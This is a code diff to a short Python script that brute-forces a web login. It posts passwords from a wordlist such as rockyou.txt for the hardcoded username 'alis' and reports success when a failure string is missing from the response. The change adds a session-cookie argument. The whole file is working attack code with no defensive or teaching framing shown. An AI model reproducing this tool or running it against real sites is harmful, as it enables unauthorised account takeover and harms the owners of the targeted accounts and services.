@@ -1,12 +1,13 @@
 import requests
 import sys
 
-def Cracker(url,identifier,file):
+def Cracker(url,cookie,identifier,file):
     f = open(file,"rb")
     line = f.readlines()
     for line in line:
         data = {"username":"alis","password":f"{line.decode()}"}
-        r = requests.post(url,data=data)
+        cookie = {"session":f"{cookie}"}
+        r = requests.post(url,cookies=cookie,data=data)
         res_text = r.text
         if identifier not in res_text:
             print("PASSWORD IS CRACKED SUCCESFULLY!")
@@ -20,15 +21,16 @@ def Cracker(url,identifier,file):
 
 
 def main():
-    if len(sys.argv) != 4:
-        print("(+) Usage: %s <url> <identifier> <file_name>" % sys.argv[0])
-        print("(+) Example: %s www.example.com Invalid password rockyou.txt"% sys.argv[0])
+    if len(sys.argv) != 5:
+        print("(+) Usage: %s <url> <cookie> <identifier> <file_name>" % sys.argv[0])
+        print("(+) Example: %s www.example.com <session_cookie> Invalid password rockyou.txt"% sys.argv[0])
     
     url = sys.argv[1]
-    identifier = sys.argv[2] 
-    file = sys.argv[3]
+    cookie = sys.argv[2]
+    identifier = sys.argv[3] 
+    file = sys.argv[4]
     print("(+) Retrieving password.....")
-    Cracker(url,identifier,file)
+    Cracker(url,cookie,identifier,file)
     
         
 if __name__ == "__main__":
